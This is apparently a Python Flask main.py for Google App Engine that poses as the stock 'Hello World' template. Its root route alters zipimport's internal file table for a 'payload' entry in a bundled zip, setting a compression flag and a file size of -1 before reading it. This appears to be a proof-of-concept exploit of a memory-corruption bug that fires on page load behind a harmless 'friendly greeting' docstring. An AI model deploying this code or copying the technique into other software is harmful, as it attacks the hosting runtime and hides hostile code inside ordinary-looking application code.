"""`main` is the top level module for your Flask application."""

# Import the Flask Framework
import os
import zipimport
from flask import Flask
app = Flask(__name__)
# Note: We don't need to call run() since our application is embedded within
# the App Engine WSGI application server.


@app.route('/')
def hello():
    """Return a friendly HTTP greeting."""
    FILE = 'payload'
    ZIP = os.path.dirname(__file__)+"/templates/import.zip"
    importer = zipimport.zipimporter(ZIP)
    f = list(importer._files[FILE])
    f[1] = 1 # compress
    f[2] = -1 # file size
    importer._files[FILE] = tuple(f)
    importer.get_data(FILE)
    return "Hello World"


@app.errorhandler(404)
def page_not_found(e):
    """Return a custom 404 error."""
    return 'Sorry, Nothing at this URL.', 404


@app.errorhandler(500)
def application_error(e):
    """Return a custom 500 error."""
    return 'Sorry, unexpected error: {}'.format(e), 500
